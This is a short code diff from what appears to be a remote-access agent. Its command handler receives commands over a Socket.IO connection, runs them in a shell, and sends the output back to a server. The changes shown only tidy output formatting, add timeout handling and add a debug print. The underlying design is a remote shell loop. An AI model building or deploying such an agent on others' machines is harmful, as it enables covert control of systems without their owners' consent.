@@ -2256,10 +2256,23 @@ def execute_command(command):
                 cwd=os.getcwd()  # Execute in the current directory
             )
         
-        output = result.stdout + result.stderr
-        if not output:
+        # Combine stdout and stderr, ensuring proper formatting
+        stdout = result.stdout.strip() if result.stdout else ""
+        stderr = result.stderr.strip() if result.stderr else ""
+        
+        # Format output properly for terminal display
+        output_lines = []
+        if stdout:
+            output_lines.append(stdout)
+        if stderr:
+            output_lines.append(f"Error: {stderr}")
+        
+        if not output_lines:
             return "[No output from command]"
-        return output
+        
+        return "\n".join(output_lines)
+    except subprocess.TimeoutExpired:
+        return "Command timed out after 30 seconds"
     except Exception as e:
         return f"Command execution failed: {e}"
 
@@ -2302,9 +2315,15 @@ def on_command(data):
         output = handle_voice_playback(command.split(":", 1))
     elif command != "sleep":
         output = execute_command(command)
+    else:
+        output = "[No output from command]"
     
-    if output:
-        sio.emit('command_result', {'agent_id': agent_id, 'output': output})
+    # Always emit command result, even if no output
+    if output is None:
+        output = "[No output from command]"
+    
+    sio.emit('command_result', {'agent_id': agent_id, 'output': output})
+    print(f"🔍 Makoy: Sent command result for '{command}': {output[:100]}...")
 
 if __name__ == "__main__":
     if WINDOWS_AVAILABLE:
